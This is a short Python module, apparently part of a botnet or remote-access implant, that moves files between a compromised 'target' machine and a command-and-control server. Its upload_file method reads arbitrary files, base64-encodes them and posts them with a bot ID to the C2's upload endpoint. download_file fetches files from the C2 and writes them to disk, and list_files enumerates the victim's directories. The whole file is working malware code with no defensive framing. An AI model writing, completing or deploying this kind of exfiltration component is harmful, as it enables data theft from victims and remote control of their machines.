#!/usr/bin/env python3
# FILE TRANSFER MODULE - Upload/Download files from target
import os
import sys
import requests
import base64
import json
import hashlib

class FileTransfer:
    def __init__(self, c2_server=None):
        self.c2_server = c2_server or "http://localhost:5000"
        
    def upload_file(self, filepath, bot_id):
        """Upload file to C2 server"""
        if not os.path.exists(filepath):
            return {"error": "File not found"}
        
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            
            filename = os.path.basename(filepath)
            size = len(content)
            md5 = hashlib.md5(content).hexdigest()
            b64_content = base64.b64encode(content).decode()
            
            data = {
                "bot_id": bot_id,
                "filename": filename,
                "size": size,
                "md5": md5,
                "content": b64_content
            }
            
            response = requests.post(f"{self.c2_server}/api/upload", json=data, timeout=30)
            return {"success": True, "filename": filename, "size": size}
        except Exception as e:
            return {"error": str(e)}
    
    def download_file(self, filename, save_path):
        """Download file from C2 server"""
        try:
            response = requests.get(f"{self.c2_server}/api/download/{filename}", timeout=30)
            if response.status_code == 200:
                data = response.json()
                content = base64.b64decode(data.get('content', ''))
                with open(save_path, 'wb') as f:
                    f.write(content)
                return {"success": True, "path": save_path, "size": len(content)}
            return {"error": "File not found"}
        except Exception as e:
            return {"error": str(e)}
    
    def list_files(self, directory="."):
        """List files in directory"""
        try:
            files = []
            for item in os.listdir(directory):
                path = os.path.join(directory, item)
                if os.path.isfile(path):
                    files.append({
                        "name": item,
                        "size": os.path.getsize(path),
                        "modified": os.path.getmtime(path)
                    })
                elif os.path.isdir(path):
                    files.append({
                        "name": f"{item}/",
                        "size": 0,
                        "is_dir": True
                    })
            return {"success": True, "files": files, "cwd": os.getcwd()}
        except Exception as e:
            return {"error": str(e)}
